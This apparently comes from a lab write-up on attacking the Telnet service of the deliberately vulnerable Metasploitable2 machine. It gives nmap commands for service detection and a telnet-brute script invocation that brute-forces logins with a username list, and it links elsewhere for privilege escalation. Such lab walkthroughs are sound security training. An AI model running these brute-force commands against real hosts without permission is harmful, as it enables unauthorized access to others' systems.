# 📚 Port 23 Telnet

## ⚙️ Service and version detection through nmap

    nmap -sV -p 23 *Target-IP*

<img width="773" height="284" alt="1 scan" src="https://github.com/user-attachments/assets/a5a0fb9e-b1bf-4e40-a0ec-f537309e95f9" />

## ✅ Searching for nmap built-in scripts for telnet

    cat /usr/share/nmap/scripts/script.db | grep telnet

<img width="777" height="149" alt="2 Script" src="https://github.com/user-attachments/assets/86b11979-800f-48cf-98f3-9d2721d0a791" />

## 📄 Using the previously found [usernames](https://github.com/ctrl-sid2099/VulnHub-Writeups/tree/main/Metasploitable2/OpenSSH-4.7p1#%EF%B8%8F-step-2-user-enumration-through-metasploit-ssh_enumusers-auxiliary-scanner) list to Brute-Force through nmap telnet-brute.nse script

<img width="502" height="163" alt="6 User-Found" src="https://github.com/user-attachments/assets/8858f7db-472b-4d16-a782-280ef5251318" />

    nmap --script telnet-brute.nse -p 23 **Target-IP** --script-args userdb=*UserName.txt*,brute.firstonly

<img width="841" height="337" alt="3 Brute-Force" src="https://github.com/user-attachments/assets/73488794-45aa-43e9-8263-cada495cd125" />

## 🔥 From here the steps are same as OpenSSH exploitation step: 4 for privilege escalation

👉 Checkout the OpenSSH exploitation step: 4 [here](https://github.com/ctrl-sid2099/VulnHub-Writeups/tree/main/Metasploitable2/OpenSSH-4.7p1#-step-4-initial-access) for more details.
